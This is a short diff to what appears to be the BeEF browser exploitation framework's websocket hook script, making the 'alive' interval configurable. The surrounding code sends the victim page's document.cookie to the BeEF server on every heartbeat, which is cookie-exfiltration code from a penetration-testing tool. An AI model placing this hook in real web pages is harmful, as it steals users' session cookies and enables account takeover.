@@ -21,6 +21,8 @@ beef.websocket = {
 
     socket:null,
 
+    alive_timer:5000,
+
     init:function () {
         var webSocketServer = beef.net.host;
         var webSocketPort = 11989;
@@ -61,7 +63,7 @@ beef.websocket = {
     alive: function (){
         beef.websocket.send('{"alive":"'+document.cookie+'"}');
         console.log("sent alive");
-        setTimeout("beef.websocket.alive()", 5000);
+        setTimeout("beef.websocket.alive()", beef.websocket.alive_timer);
 
     }
 
